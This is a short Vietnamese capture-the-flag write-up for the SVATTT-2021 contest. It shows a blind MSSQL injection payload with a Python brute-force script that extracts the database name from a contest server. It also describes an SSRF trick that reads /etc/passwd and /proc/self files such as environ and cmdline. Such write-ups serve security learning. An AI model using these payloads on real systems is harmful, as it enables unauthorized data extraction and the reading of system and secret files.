# SVATTT-2021
# script kiddie
* mssql injection : test vài case thì phát hiện nó chỉ hiện thị Error nếu có lỗi => blind rồi, chỉ cần tìm payload control được Error theo Boolean là được
* Payload :  id|(iif(substring(db_name(),1,1)='{',1,'b'))  (Nôm na là nó sẽ sort theo id nếu cái điều kiện trong if đúng thì trả về 1 (đúng vì id là int ) , còn nếu sai thì trả về 'b' (báo lỗi vì id là int chứ ko phải varchar))
```
import requests
import string
url="http://167.172.85.253/web100/index.php?sort="
payload="id|(iif(substring(db_name()," 

payload1= ",1)='"

payload2= "',1,'b'))"
k=0
flag=""
while 1:
  k=k+1
  print(k)
  for i in "{}_,@." + string.ascii_letters + string.digits :
    payloadd=payload+"{}".format(k)+payload1+i+payload2
    #print(payloadd)
    r =requests.get(url+payloadd)
    if "Error" not in r.text :
      flag=flag+i
      print(flag)
      break

```
# OProxy
* Bài này mình làm theo unintended : trigger ssrf để đọc /etc/passwd : file://localhost/etc/passwd 
* Tiếp theo fuzzing flag ở thư mục root thì không thấy, thử fuzzing trong thư mục web bằng đường đẫn thần thánh (/proc/self/cwd <=> pwd command) , và fuzzing flag.txt
* Chúng ta có thể rà được một số manh mối tại các đường dẫn : /proc/self/environ , /proc/self/fd/${id} , /proc/self/cmdline, ..... 
